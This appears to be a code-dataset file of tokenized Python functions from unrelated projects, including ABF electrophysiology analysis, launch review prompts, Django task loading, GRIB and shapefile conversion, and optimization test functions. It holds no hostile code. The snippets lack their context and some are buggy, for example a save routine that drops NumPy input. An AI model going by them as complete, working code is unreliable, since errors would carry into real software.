def _launch_all ( self , launchers ) : for launcher in launchers : print ( "== Launching  %s ==" % launcher . batch_name ) launcher ( ) return True
def _review_all ( self , launchers ) : # Run review of launch args if necessary if self . launch_args is not None : proceed = self . review_args ( self . launch_args , show_repr = True , heading = 'Meta Arguments' ) if not proceed : return False reviewers = [ self . review_args , self . review_command , self . review_launcher ] for ( count , launcher ) in enumerate ( launchers ) : # Run reviews for all launchers if desired... if not all ( reviewer ( launcher ) for reviewer in reviewers ) : print ( "\n == Aborting launch ==" ) return False # But allow the user to skip these extra reviews if len ( launchers ) != 1 and count < len ( launchers ) - 1 : skip_remaining = self . input_options ( [ 'Y' , 'n' , 'quit' ] , '\nSkip remaining reviews?' , default = 'y' ) if skip_remaining == 'y' : break elif skip_remaining == 'quit' : return False if self . input_options ( [ 'y' , 'N' ] , 'Execute?' , default = 'n' ) != 'y' : return False else : return self . _launch_all ( launchers )
def input_options ( self , options , prompt = 'Select option' , default = None ) : check_options = [ x . lower ( ) for x in options ] while True : response = input ( '%s [%s]: ' % ( prompt , ', ' . join ( options ) ) ) . lower ( ) if response in check_options : return response . strip ( ) elif response == '' and default is not None : return default . lower ( ) . strip ( )
def save ( self , filename , imdata , * * data ) : if isinstance ( imdata , numpy . ndarray ) : imdata = Image . fromarray ( numpy . uint8 ( imdata ) ) elif isinstance ( imdata , Image . Image ) : imdata . save ( self . _savepath ( filename ) )
def fileModifiedTimestamp ( fname ) : modifiedTime = os . path . getmtime ( fname ) stamp = time . strftime ( '%Y-%m-%d' , time . localtime ( modifiedTime ) ) return stamp
def loadResults ( resultsFile ) : with open ( resultsFile ) as f : raw = f . read ( ) . split ( "\n" ) foldersByDay = { } for line in raw : folder = line . split ( '"' ) [ 1 ] + "\\" line = [ ] + line . split ( '"' ) [ 2 ] . split ( ", " ) for day in line [ 1 : ] : if not day in foldersByDay : foldersByDay [ day ] = [ ] foldersByDay [ day ] = foldersByDay [ day ] + [ folder ] nActiveDays = len ( foldersByDay ) dayFirst = sorted ( foldersByDay . keys ( ) ) [ 0 ] dayLast = sorted ( foldersByDay . keys ( ) ) [ - 1 ] dayFirst = datetime . datetime . strptime ( dayFirst , "%Y-%m-%d" ) dayLast = datetime . datetime . strptime ( dayLast , "%Y-%m-%d" ) nDays = ( dayLast - dayFirst ) . days + 1 emptyDays = 0 for deltaDays in range ( nDays ) : day = dayFirst + datetime . timedelta ( days = deltaDays ) stamp = datetime . datetime . strftime ( day , "%Y-%m-%d" ) if not stamp in foldersByDay : foldersByDay [ stamp ] = [ ] emptyDays += 1 percActive = nActiveDays / nDays * 100 print ( "%d of %d days were active (%.02f%%)" % ( nActiveDays , nDays , percActive ) ) return foldersByDay
def abfinfo ( self , printToo = False , returnDict = False ) : info = "\n### ABF INFO ###\n" d = { } for thingName in sorted ( dir ( self ) ) : if thingName in [ 'cm' , 'evIs' , 'colormap' , 'dataX' , 'dataY' , 'protoX' , 'protoY' ] : continue if "_" in thingName : continue thing = getattr ( self , thingName ) if type ( thing ) is list and len ( thing ) > 5 : continue thingType = str ( type ( thing ) ) . split ( "'" ) [ 1 ] if "method" in thingType or "neo." in thingType : continue if thingName in [ "header" , "MT" ] : continue info += "%s <%s> %s\n" % ( thingName , thingType , thing ) d [ thingName ] = thing if printToo : print ( ) for line in info . split ( "\n" ) : if len ( line ) < 3 : continue print ( "   " , line ) print ( ) if returnDict : return d return info
def headerHTML ( self , fname = None ) : if fname is None : fname = self . fname . replace ( ".abf" , "_header.html" ) html = "<html><body><code>" html += "<h2>abfinfo() for %s.abf</h2>" % self . ID html += self . abfinfo ( ) . replace ( "<" , "&lt;" ) . replace ( ">" , "&gt;" ) . replace ( "\n" , "<br>" ) html += "<h2>Header for %s.abf</h2>" % self . ID html += pprint . pformat ( self . header , indent = 1 ) html = html . replace ( "\n" , '<br>' ) . replace ( " " , "&nbsp;" ) html = html . replace ( r"\x00" , "" ) html += "</code></body></html>" print ( "WRITING HEADER TO:" ) print ( fname ) f = open ( fname , 'w' ) f . write ( html ) f . close ( )
def generate_colormap ( self , colormap = None , reverse = False ) : if colormap is None : colormap = pylab . cm . Dark2 self . cm = colormap self . colormap = [ ] for i in range ( self . sweeps ) : #TODO: make this the only colormap self . colormap . append ( colormap ( i / self . sweeps ) ) if reverse : self . colormap . reverse ( )
def filter_gaussian ( self , sigmaMs = 100 , applyFiltered = False , applyBaseline = False ) : if sigmaMs == 0 : return self . dataY filtered = cm . filter_gaussian ( self . dataY , sigmaMs ) if applyBaseline : self . dataY = self . dataY - filtered elif applyFiltered : self . dataY = filtered else : return filtered
def to_table ( args , vdims = [ ] ) : if not Table : return "HoloViews Table not available" kdims = [ dim for dim in args . constant_keys + args . varying_keys if dim not in vdims ] items = [ tuple ( [ spec [ k ] for k in kdims + vdims ] ) for spec in args . specs ] return Table ( items , kdims = kdims , vdims = vdims )
def spec_formatter ( cls , spec ) : return type ( spec ) ( ( k , str ( v ) ) for ( k , v ) in spec . items ( ) )
def linspace ( self , start , stop , n ) : if n == 1 : return [ start ] L = [ 0.0 ] * n nm1 = n - 1 nm1inv = 1.0 / nm1 for i in range ( n ) : L [ i ] = nm1inv * ( start * ( nm1 - i ) + stop * i ) return L
def _load_expansion ( self , key , root , pattern ) : path_pattern = os . path . join ( root , pattern ) expanded_paths = self . _expand_pattern ( path_pattern ) specs = [ ] for ( path , tags ) in expanded_paths : filelist = [ os . path . join ( path , f ) for f in os . listdir ( path ) ] if os . path . isdir ( path ) else [ path ] for filepath in filelist : specs . append ( dict ( tags , * * { key : os . path . abspath ( filepath ) } ) ) return sorted ( specs , key = lambda s : s [ key ] )
async def _push ( self , * args , * * kwargs ) : self . _data . append ( ( args , kwargs ) ) if self . _future is not None : future , self . _future = self . _future , None future . set_result ( True )
def figureStimulus ( abf , sweeps = [ 0 ] ) : stimuli = [ 2.31250 , 2.35270 ] for sweep in sweeps : abf . setsweep ( sweep ) for stimulus in stimuli : S1 = int ( abf . pointsPerSec * stimulus ) S2 = int ( abf . pointsPerSec * ( stimulus + 0.001 ) ) # 1ms of blanking abf . sweepY [ S1 : S2 ] = np . nan # blank out the stimulus area I1 = int ( abf . pointsPerSec * 2.2 ) # time point (sec) to start I2 = int ( abf . pointsPerSec * 2.6 ) # time point (sec) to end baseline = np . average ( abf . sweepY [ int ( abf . pointsPerSec * 2.0 ) : int ( abf . pointsPerSec * 2.2 ) ] ) Ys = lowPassFilter ( abf . sweepY [ I1 : I2 ] ) - baseline Xs = abf . sweepX2 [ I1 : I1 + len ( Ys ) ] . flatten ( ) plt . plot ( Xs , Ys , alpha = .5 , lw = 2 ) return
def doStuff ( ABFfolder , analyze = False , convert = False , index = True , overwrite = True , launch = True ) : IN = INDEX ( ABFfolder ) if analyze : IN . analyzeAll ( ) if convert : IN . convertImages ( )
def analyzeSingle ( abfFname ) : assert os . path . exists ( abfFname ) and abfFname . endswith ( ".abf" ) ABFfolder , ABFfname = os . path . split ( abfFname ) abfID = os . path . splitext ( ABFfname ) [ 0 ] IN = INDEX ( ABFfolder ) IN . analyzeABF ( abfID ) IN . scan ( ) IN . html_single_basic ( [ abfID ] , overwrite = True ) IN . html_single_plot ( [ abfID ] , overwrite = True ) IN . scan ( ) IN . html_index ( ) return
def analyzeAll ( self ) : searchableData = str ( self . files2 ) self . log . debug ( "considering analysis for %d ABFs" , len ( self . IDs ) ) for ID in self . IDs : if not ID + "_" in searchableData : self . log . debug ( "%s needs analysis" , ID ) try : self . analyzeABF ( ID ) except : print ( "EXCEPTION! " * 100 ) else : self . log . debug ( "%s has existing analysis, not overwriting" , ID ) self . log . debug ( "verified analysis of %d ABFs" , len ( self . IDs ) )
def htmlFor ( self , fname ) : if os . path . splitext ( fname ) [ 1 ] . lower ( ) in [ '.jpg' , '.png' ] : html = '<a href="%s"><img src="%s"></a>' % ( fname , fname ) if "_tif_" in fname : html = html . replace ( '<img ' , '<img class="datapic micrograph"' ) if "_plot_" in fname : html = html . replace ( '<img ' , '<img class="datapic intrinsic" ' ) if "_experiment_" in fname : html = html . replace ( '<img ' , '<img class="datapic experiment" ' ) elif os . path . splitext ( fname ) [ 1 ] . lower ( ) in [ '.html' , '.htm' ] : html = 'LINK: %s' % fname else : html = '<br>Not sure how to show: [%s]</br>' % fname return html
def html_single_plot ( self , abfID , launch = False , overwrite = False ) : if type ( abfID ) is str : abfID = [ abfID ] for thisABFid in cm . abfSort ( abfID ) : parentID = cm . parent ( self . groups , thisABFid ) saveAs = os . path . abspath ( "%s/%s_plot.html" % ( self . folder2 , parentID ) ) if overwrite is False and os . path . basename ( saveAs ) in self . files2 : continue filesByType = cm . filesByType ( self . groupFiles [ parentID ] ) html = "" html += '<div style="background-color: #DDDDFF;">' html += '<span class="title">intrinsic properties for: %s</span></br>' % parentID html += '<code>%s</code>' % os . path . abspath ( self . folder1 + "/" + parentID + ".abf" ) html += '</div>' for fname in filesByType [ 'plot' ] : html += self . htmlFor ( fname ) print ( "creating" , saveAs , '...' ) style . save ( html , saveAs , launch = launch )
def timeit ( timer = None ) : if timer is None : return time . time ( ) else : took = time . time ( ) - timer if took < 1 : return "%.02f ms" % ( took * 1000.0 ) elif took < 60 : return "%.02f s" % ( took ) else : return "%.02f min" % ( took / 60.0 )
def list_move_to_front ( l , value = 'other' ) : l = list ( l ) if value in l : l . remove ( value ) l . insert ( 0 , value ) return l
def list_move_to_back ( l , value = 'other' ) : l = list ( l ) if value in l : l . remove ( value ) l . append ( value ) return l
def parent ( groups , ID ) : if ID in groups . keys ( ) : return ID # already a parent if not ID in groups . keys ( ) : for actualParent in groups . keys ( ) : if ID in groups [ actualParent ] : return actualParent # found the actual parent return None
def userFolder ( ) : #path=os.path.abspath(tempfile.gettempdir()+"/swhlab/") #don't use tempdir! it will get deleted easily. path = os . path . expanduser ( "~" ) + "/.swhlab/" # works on windows or linux # for me, path=r"C:\Users\swharden\.swhlab" if not os . path . exists ( path ) : print ( "creating" , path ) os . mkdir ( path ) return os . path . abspath ( path )
def abfFname_Load ( ) : fname = userFolder ( ) + "/abfFname.ini" if os . path . exists ( fname ) : abfFname = open ( fname ) . read ( ) . strip ( ) if os . path . exists ( abfFname ) or abfFname . endswith ( "_._" ) : return abfFname return os . path . abspath ( os . sep )
def abfFname_Save ( abfFname ) : fname = userFolder ( ) + "/abfFname.ini" with open ( fname , 'w' ) as f : f . write ( os . path . abspath ( abfFname ) ) return
def _check_limit ( self , event ) : if self . count ( event ) > self . max_listeners : warnings . warn ( 'Too many listeners for event {}' . format ( event ) , ResourceWarning , )
def once ( self , event , listener ) : self . emit ( 'new_listener' , event , listener ) self . _once [ event ] . append ( listener ) self . _check_limit ( event ) return self
def genPNGs ( folder , files = None ) : if files is None : files = glob . glob ( folder + "/*.*" ) new = [ ] for fname in files : ext = os . path . basename ( fname ) . split ( "." ) [ - 1 ] . lower ( ) if ext in [ 'tif' , 'tiff' ] : if not os . path . exists ( fname + ".png" ) : print ( " -- converting %s to PNG..." % os . path . basename ( fname ) ) cm . image_convert ( fname ) new . append ( fname ) #fancy burn-in of image data else : pass #print(" -- already converted %s to PNG..."%os.path.basename(fname)) return new
def htmlABF ( ID , group , d , folder , overwrite = False ) : fname = folder + "/swhlab4/%s_index.html" % ID if overwrite is False and os . path . exists ( fname ) : return html = TEMPLATES [ 'abf' ] html = html . replace ( "~ID~" , ID ) html = html . replace ( "~CONTENT~" , htmlABFcontent ( ID , group , d ) ) print ( " <- writing [%s]" % os . path . basename ( fname ) ) with open ( fname , 'w' ) as f : f . write ( html ) return
def genIndex ( folder , forceIDs = [ ] ) : if not os . path . exists ( folder + "/swhlab4/" ) : print ( " !! cannot index if no /swhlab4/" ) return timestart = cm . timethis ( ) files = glob . glob ( folder + "/*.*" ) #ABF folder files . extend ( glob . glob ( folder + "/swhlab4/*.*" ) ) print ( " -- indexing glob took %.02f ms" % ( cm . timethis ( timestart ) * 1000 ) ) files . extend ( genPNGs ( folder , files ) ) files = sorted ( files ) timestart = cm . timethis ( ) d = cm . getIDfileDict ( files ) #TODO: this is really slow print ( " -- filedict length:" , len ( d ) ) print ( " -- generating ID dict took %.02f ms" % ( cm . timethis ( timestart ) * 1000 ) ) groups = cm . getABFgroups ( files ) print ( " -- groups length:" , len ( groups ) ) for ID in sorted ( list ( groups . keys ( ) ) ) : overwrite = False for abfID in groups [ ID ] : if abfID in forceIDs : overwrite = True try : htmlABF ( ID , groups [ ID ] , d , folder , overwrite ) except : print ( "~~ HTML GENERATION FAILED!!!" ) menu = expMenu ( groups , folder ) makeSplash ( menu , folder ) makeMenu ( menu , folder ) htmlFrames ( d , folder ) makeMenu ( menu , folder ) makeSplash ( menu , folder )
def plotAllSweeps ( abfFile ) : r = io . AxonIO ( filename = abfFile ) bl = r . read_block ( lazy = False , cascade = True ) print ( abfFile + "\nplotting %d sweeps..." % len ( bl . segments ) ) plt . figure ( figsize = ( 12 , 10 ) ) plt . title ( abfFile ) for sweep in range ( len ( bl . segments ) ) : trace = bl . segments [ sweep ] . analogsignals [ 0 ] plt . plot ( trace . times - trace . times [ 0 ] , trace . magnitude , alpha = .5 ) plt . ylabel ( trace . dimensionality ) plt . xlabel ( "seconds" ) plt . show ( ) plt . close ( )
def plot_shaded_data ( X , Y , variances , varianceX ) : plt . plot ( X , Y , color = 'k' , lw = 2 ) nChunks = int ( len ( Y ) / CHUNK_POINTS ) for i in range ( 0 , 100 , PERCENT_STEP ) : varLimitLow = np . percentile ( variances , i ) varLimitHigh = np . percentile ( variances , i + PERCENT_STEP ) varianceIsAboveMin = np . where ( variances >= varLimitLow ) [ 0 ] varianceIsBelowMax = np . where ( variances <= varLimitHigh ) [ 0 ] varianceIsRange = [ chunkNumber for chunkNumber in range ( nChunks ) if chunkNumber in varianceIsAboveMin and chunkNumber in varianceIsBelowMax ] for chunkNumber in varianceIsRange : t1 = chunkNumber * CHUNK_POINTS / POINTS_PER_SEC t2 = t1 + CHUNK_POINTS / POINTS_PER_SEC plt . axvspan ( t1 , t2 , alpha = .3 , color = COLORMAP ( i / 100 ) , lw = 0 )
def show_variances ( Y , variances , varianceX , logScale = False ) : plt . figure ( 1 , figsize = ( 10 , 7 ) ) plt . figure ( 2 , figsize = ( 10 , 7 ) ) varSorted = sorted ( variances ) plt . figure ( 1 ) plt . subplot ( 211 ) plt . grid ( ) plt . title ( "chronological variance" ) plt . ylabel ( "original data" ) plot_shaded_data ( X , Y , variances , varianceX ) plt . margins ( 0 , .1 ) plt . subplot ( 212 ) plt . ylabel ( "variance (pA) (log%s)" % str ( logScale ) ) plt . xlabel ( "time in sweep (sec)" ) plt . plot ( varianceX , variances , 'k-' , lw = 2 ) plt . figure ( 2 ) plt . ylabel ( "variance (pA) (log%s)" % str ( logScale ) ) plt . xlabel ( "chunk number" ) plt . title ( "sorted variance" ) plt . plot ( varSorted , 'k-' , lw = 2 ) for i in range ( 0 , 100 , PERCENT_STEP ) : varLimitLow = np . percentile ( variances , i ) varLimitHigh = np . percentile ( variances , i + PERCENT_STEP ) label = "%2d-%d percentile" % ( i , i + + PERCENT_STEP ) color = COLORMAP ( i / 100 ) print ( "%s: variance = %.02f - %.02f" % ( label , varLimitLow , varLimitHigh ) ) plt . figure ( 1 ) plt . axhspan ( varLimitLow , varLimitHigh , alpha = .5 , lw = 0 , color = color , label = label ) plt . figure ( 2 ) chunkLow = np . where ( varSorted >= varLimitLow ) [ 0 ] [ 0 ] chunkHigh = np . where ( varSorted >= varLimitHigh ) [ 0 ] [ 0 ] plt . axvspan ( chunkLow , chunkHigh , alpha = .5 , lw = 0 , color = color , label = label ) for fignum in [ 1 , 2 ] : plt . figure ( fignum ) if logScale : plt . semilogy ( ) plt . margins ( 0 , 0 ) plt . grid ( ) if fignum is 2 : plt . legend ( fontsize = 10 , loc = 'upper left' , shadow = True ) plt . tight_layout ( ) plt . savefig ( '2016-12-15-variance-%d-log%s.png' % ( fignum , str ( logScale ) ) ) plt . show ( )
def detect ( self ) : self . log . info ( "initializing AP detection on all sweeps..." ) t1 = cm . timeit ( ) for sweep in range ( self . abf . sweeps ) : self . detectSweep ( sweep ) self . log . info ( "AP analysis of %d sweeps found %d APs (completed in %s)" , self . abf . sweeps , len ( self . APs ) , cm . timeit ( t1 ) )
def detectSweep ( self , sweep = 0 ) : if self . APs is False : # indicates detection never happened self . APs = [ ] # now indicates detection occured # delete every AP from this sweep from the existing array for i , ap in enumerate ( self . APs ) : if ap [ "sweep" ] == sweep : self . APs [ i ] = None if self . APs . count ( None ) : self . log . debug ( "deleting %d existing APs from memory" , self . APs . count ( None ) ) while None in self . APs : self . APs . remove ( None ) self . log . debug ( "initiating AP detection (%d already in memory)" , len ( self . APs ) ) self . abf . derivative = True self . abf . setsweep ( sweep ) # detect potential AP (Is) by a dV/dT threshold crossing Is = cm . where_cross ( self . abf . sweepD , self . detect_over ) self . log . debug ( "initial AP detection: %d APs" % len ( Is ) ) # eliminate APs where dV/dT doesn't cross below -10 V/S within 2 ms for i , I in enumerate ( Is ) : if np . min ( self . abf . sweepD [ I : I + 2 * self . abf . pointsPerMs ] ) > - 10 : Is [ i ] = 0 Is = Is [ np . nonzero ( Is ) ] self . log . debug ( "after lower threshold checking: %d APs" % len ( Is ) ) # walk 1ms backwards and find point of +10 V/S threshold crossing for i , I in enumerate ( Is ) : stepBack = 0 while ( self . abf . sweepD [ I - stepBack ] ) > 10 and stepBack / self . abf . pointsPerMs < 1 : #2ms max stepBack += 1 Is [ i ] -= stepBack # analyze each AP sweepAPs = [ ] for i , I in enumerate ( Is ) : try : timeInSweep = I / self . abf . pointsPerSec if timeInSweep < self . detect_time1 or timeInSweep > self . detect_time2 : continue # skip because it's not within the marks ap = { } # create the AP entry ap [ "sweep" ] = sweep # number of the sweep containing this AP ap [ "I" ] = I # index sweep point of start of AP (10 mV/ms threshold crossing) ap [ "Tsweep" ] = I / self . abf . pointsPerSec # time in the sweep of index crossing (sec) ap [ "T" ] = ap [ "Tsweep" ] + self . abf . sweepInterval * sweep # time in the experiment ap [ "Vthreshold" ] = self . abf . sweepY [ I ] # threshold at rate of -10mV/ms # determine how many points from the start dV/dt goes below -10 (from a 5ms chunk) chunk = self . abf . sweepD [ I : I + 5 * self . abf . pointsPerMs ] # give it 5ms to cross once I_toNegTen = np . where ( chunk < - 10 ) [ 0 ] [ 0 ] chunk = self . abf . sweepD [ I + I_toNegTen : I + I_toNegTen + 10 * self . abf . pointsPerMs ] # give it 30ms to cross back if not max ( chunk ) > - 10 : self . log . debug ( "skipping unreal AP at T=%f" % ap [ "T" ] ) self . log . error ( "^^^ can you confirm this is legit?" ) continue # probably a pre-AP "bump" to be ignored I_recover = np . where ( chunk > - 10 ) [ 0 ] [ 0 ] + I_toNegTen + I # point where trace returns to above -10 V/S ap [ "dVfastIs" ] = [ I , I_recover ] # span of the fast component of the dV/dt trace ap [ "dVfastMS" ] = ( I_recover - I ) / self . abf . pointsPerMs # time (in ms) of this fast AP component # determine derivative min/max from a 2ms chunk which we expect to capture the fast AP chunk = self . abf . sweepD [ ap [ "dVfastIs" ] [ 0 ] : ap [ "dVfastIs" ] [ 1 ] ] ap [ "dVmax" ] = np . max ( chunk ) ap [ "dVmaxI" ] = np . where ( chunk == ap [ "dVmax" ] ) [ 0 ] [ 0 ] + I ap [ "dVmin" ] = np . min ( chunk ) ap [ "dVminI" ] = np . where ( chunk == ap [ "dVmin" ] ) [ 0 ] [ 0 ] + I if ap [ "dVmax" ] < 10 or ap [ "dVmin" ] > - 10 : self . log . debug ( "throwing out AP with low dV/dt to be an AP" ) self . log . error ( "^^^ can you confirm this is legit?" ) continue # before determining AP shape stats, see where trace recovers to threshold chunkSize = self . abf . pointsPerMs * 10 #AP shape may be 10ms if len ( Is ) - 1 > i and Is [ i + 1 ] < ( I + chunkSize ) : # if slow AP runs into next AP chunkSize = Is [ i + 1 ] - I # chop it down if chunkSize < ( self . abf . pointsPerMs * 2 ) : continue # next AP is so soon, it's >500 Hz. Can't be real. ap [ "VslowIs" ] = [ I , I + chunkSize ] # time range of slow AP dynamics chunk = self . abf . sweepY [ I : I + chunkSize ] # determine AP peak and minimum ap [ "Vmax" ] = np . max ( chunk ) ap [ "VmaxI" ] = np . where ( chunk == ap [ "Vmax" ] ) [ 0 ] [ 0 ] + I chunkForMin = np . copy ( chunk ) # so we can destroy it chunkForMin [ : ap [ "VmaxI" ] - I ] = np . inf # minimum won't be before peak now ap [ "Vmin" ] = np . min ( chunkForMin ) # supposedly the minimum is the AHP ap [ "VminI" ] = np . where ( chunkForMin == ap [ "Vmin" ] ) [ 0 ] [ 0 ] + I if ap [ "VminI" ] < ap [ "VmaxI" ] : self . log . error ( "-------------------------------" ) self . log . error ( "how is the AHP before the peak?" ) #TODO: start chunk at the peak self . log . error ( "-------------------------------" ) #print((I+len(chunk))-ap["VminI"],len(chunk)) if ( len ( chunk ) ) - ( ( I + len ( chunk ) ) - ap [ "VminI" ] ) < 10 : self . log . error ( "-------------------------------" ) self . log . error ( "HP too close for comfort!" ) self . log . error ( "-------------------------------" ) ap [ "msRiseTime" ] = ( ap [ "VmaxI" ] - I ) / self . abf . pointsPerMs # time from threshold to peak ap [ "msFallTime" ] = ( ap [ "VminI" ] - ap [ "VmaxI" ] ) / self . abf . pointsPerMs # time from peak to nadir # determine halfwidth ap [ "Vhalf" ] = np . average ( [ ap [ "Vmax" ] , ap [ "Vthreshold" ] ] ) # half way from threshold to peak ap [ "VhalfI1" ] = cm . where_cross ( chunk , ap [ "Vhalf" ] ) [ 0 ] + I # time it's first crossed ap [ "VhalfI2" ] = cm . where_cross ( - chunk , - ap [ "Vhalf" ] ) [ 1 ] + I # time it's second crossed ap [ "msHalfwidth" ] = ( ap [ "VhalfI2" ] - ap [ "VhalfI1" ] ) / self . abf . pointsPerMs # time between crossings # AP error checking goes here # TODO: # if we got this far, add the AP to the list sweepAPs . extend ( [ ap ] ) except Exception as e : self . log . error ( "crashed analyzing AP %d of %d" , i , len ( Is ) ) self . log . error ( cm . exceptionToString ( e ) ) #cm.pause() #cm.waitFor(30) #self.log.error("EXCEPTION!:\n%s"%str(sys.exc_info())) self . log . debug ( "finished analyzing sweep. Found %d APs" , len ( sweepAPs ) ) self . APs . extend ( sweepAPs ) self . abf . derivative = False
def get_author_and_version ( package ) : init_py = open ( os . path . join ( package , '__init__.py' ) ) . read ( ) author = re . search ( "__author__ = ['\"]([^'\"]+)['\"]" , init_py ) . group ( 1 ) version = re . search ( "__version__ = ['\"]([^'\"]+)['\"]" , init_py ) . group ( 1 ) return author , version
def _add_parsley_ns ( cls , namespace_dict ) : namespace_dict . update ( { 'parslepy' : cls . LOCAL_NAMESPACE , 'parsley' : cls . LOCAL_NAMESPACE , } ) return namespace_dict
def message_is_to_me ( self , data ) : return ( data . get ( 'type' ) == 'message' and data . get ( 'text' , '' ) . startswith ( self . address_as ) )
def get_app_locations ( ) : return [ os . path . dirname ( os . path . normpath ( import_module ( app_name ) . __file__ ) ) for app_name in PROJECT_APPS ]
def get_tasks ( ) : task_classes = [ ] for task_path in TASKS : try : module , classname = task_path . rsplit ( '.' , 1 ) except ValueError : raise ImproperlyConfigured ( '%s isn\'t a task module' % task_path ) try : mod = import_module ( module ) except ImportError as e : raise ImproperlyConfigured ( 'Error importing task %s: "%s"' % ( module , e ) ) try : task_class = getattr ( mod , classname ) except AttributeError : raise ImproperlyConfigured ( 'Task module "%s" does not define a ' '"%s" class' % ( module , classname ) ) task_classes . append ( task_class ) return task_classes
def get_task_options ( ) : options = ( ) task_classes = get_tasks ( ) for cls in task_classes : options += cls . option_list return options
def add ( self , * entries ) : for entry in entries : if isinstance ( entry , string_types ) : self . _add_entries ( database . parse_string ( entry , bib_format = 'bibtex' ) ) else : self . _add_entries ( entry )
def get_cache_key ( user_or_username , size , prefix ) : if isinstance ( user_or_username , get_user_model ( ) ) : user_or_username = user_or_username . username return '%s_%s_%s' % ( prefix , user_or_username , size )
def invalidate_cache ( user , size = None ) : sizes = set ( AUTO_GENERATE_AVATAR_SIZES ) if size is not None : sizes . add ( size ) for prefix in cached_funcs : for size in sizes : cache . delete ( get_cache_key ( user , size , prefix ) )
def get_pref_model_class ( app , prefs , get_prefs_func ) : module = '%s.%s' % ( app , PREFS_MODULE_NAME ) model_dict = { '_prefs_app' : app , '_get_prefs' : staticmethod ( get_prefs_func ) , '__module__' : module , 'Meta' : type ( 'Meta' , ( models . options . Options , ) , { 'verbose_name' : _ ( 'Preference' ) , 'verbose_name_plural' : _ ( 'Preferences' ) , 'app_label' : app , 'managed' : False , } ) } for field_name , val_proxy in prefs . items ( ) : model_dict [ field_name ] = val_proxy . field model = type ( 'Preferences' , ( models . Model , ) , model_dict ) def fake_save_base ( self , * args , * * kwargs ) : updated_prefs = { f . name : getattr ( self , f . name ) for f in self . _meta . fields if not isinstance ( f , models . fields . AutoField ) } app_prefs = self . _get_prefs ( self . _prefs_app ) for pref in app_prefs . keys ( ) : if pref in updated_prefs : app_prefs [ pref ] . db_value = updated_prefs [ pref ] self . pk = self . _prefs_app # Make Django 1.7 happy. prefs_save . send ( sender = self , app = self . _prefs_app , updated_prefs = updated_prefs ) return True model . save_base = fake_save_base return model
def print_file_info ( ) : tpl = TableLogger ( columns = 'file,created,modified,size' ) for f in os . listdir ( '.' ) : size = os . stat ( f ) . st_size date_created = datetime . fromtimestamp ( os . path . getctime ( f ) ) date_modified = datetime . fromtimestamp ( os . path . getmtime ( f ) ) tpl ( f , date_created , date_modified , size )
def dispatch ( self , func ) : self . callees . append ( self . _make_dispatch ( func ) ) return self . _make_wrapper ( func )
def convertShpToExtend ( pathToShp ) : driver = ogr . GetDriverByName ( 'ESRI Shapefile' ) dataset = driver . Open ( pathToShp ) if dataset is not None : # from Layer layer = dataset . GetLayer ( ) spatialRef = layer . GetSpatialRef ( ) # from Geometry feature = layer . GetNextFeature ( ) geom = feature . GetGeometryRef ( ) spatialRef = geom . GetSpatialReference ( ) #WGS84 outSpatialRef = osr . SpatialReference ( ) outSpatialRef . ImportFromEPSG ( 4326 ) coordTrans = osr . CoordinateTransformation ( spatialRef , outSpatialRef ) env = geom . GetEnvelope ( ) pointMAX = ogr . Geometry ( ogr . wkbPoint ) pointMAX . AddPoint ( env [ 1 ] , env [ 3 ] ) pointMAX . Transform ( coordTrans ) pointMIN = ogr . Geometry ( ogr . wkbPoint ) pointMIN . AddPoint ( env [ 0 ] , env [ 2 ] ) pointMIN . Transform ( coordTrans ) return [ pointMAX . GetPoint ( ) [ 1 ] , pointMIN . GetPoint ( ) [ 0 ] , pointMIN . GetPoint ( ) [ 1 ] , pointMAX . GetPoint ( ) [ 0 ] ] else : exit ( " shapefile not found. Please verify your path to the shapefile" )
def convertGribToTiff ( listeFile , listParam , listLevel , liststep , grid , startDate , endDate , outFolder ) : dicoValues = { } for l in listeFile : grbs = pygrib . open ( l ) grbs . seek ( 0 ) index = 1 for j in range ( len ( listLevel ) , 0 , - 1 ) : for i in range ( len ( listParam ) - 1 , - 1 , - 1 ) : grb = grbs [ index ] p = grb . name . replace ( ' ' , '_' ) if grb . level != 0 : l = str ( grb . level ) + '_' + grb . typeOfLevel else : l = grb . typeOfLevel if p + '_' + l not in dicoValues . keys ( ) : dicoValues [ p + '_' + l ] = [ ] dicoValues [ p + '_' + l ] . append ( grb . values ) shape = grb . values . shape lat , lon = grb . latlons ( ) geoparam = ( lon . min ( ) , lat . max ( ) , grid , grid ) index += 1 nbJour = ( endDate - startDate ) . days + 1 #on joute des arrayNan si il manque des fichiers for s in range ( 0 , ( len ( liststep ) * nbJour - len ( listeFile ) ) ) : for k in dicoValues . keys ( ) : dicoValues [ k ] . append ( np . full ( shape , np . nan ) ) #On crit pour chacune des variables dans un fichier for i in range ( len ( dicoValues . keys ( ) ) - 1 , - 1 , - 1 ) : dictParam = dict ( ( k , dicoValues [ dicoValues . keys ( ) [ i ] ] [ k ] ) for k in range ( 0 , len ( dicoValues [ dicoValues . keys ( ) [ i ] ] ) ) ) sorted ( dictParam . items ( ) , key = lambda x : x [ 0 ] ) outputImg = outFolder + '/' + dicoValues . keys ( ) [ i ] + '_' + startDate . strftime ( '%Y%M%d' ) + '_' + endDate . strftime ( '%Y%M%d' ) + '.tif' writeTiffFromDicoArray ( dictParam , outputImg , shape , geoparam ) for f in listeFile : os . remove ( f )
def doublewell ( theta ) : k0 , k1 , depth = 0.01 , 100 , 0.5 shallow = 0.5 * k0 * theta ** 2 + depth deep = 0.5 * k1 * theta ** 2 obj = float ( np . minimum ( shallow , deep ) ) grad = np . where ( deep < shallow , k1 * theta , k0 * theta ) return obj , grad
def rosenbrock ( theta ) : x , y = theta obj = ( 1 - x ) ** 2 + 100 * ( y - x ** 2 ) ** 2 grad = np . zeros ( 2 ) grad [ 0 ] = 2 * x - 400 * ( x * y - x ** 3 ) - 2 grad [ 1 ] = 200 * ( y - x ** 2 ) return obj , grad
def camel ( theta ) : x , y = theta obj = 2 * x ** 2 - 1.05 * x ** 4 + x ** 6 / 6 + x * y + y ** 2 grad = np . array ( [ 4 * x - 4.2 * x ** 3 + x ** 5 + y , x + 2 * y ] ) return obj , grad
def bohachevsky1 ( theta ) : x , y = theta obj = x ** 2 + 2 * y ** 2 - 0.3 * np . cos ( 3 * np . pi * x ) - 0.4 * np . cos ( 4 * np . pi * y ) + 0.7 grad = np . array ( [ 2 * x + 0.3 * np . sin ( 3 * np . pi * x ) * 3 * np . pi , 4 * y + 0.4 * np . sin ( 4 * np . pi * y ) * 4 * np . pi , ] ) return obj , grad
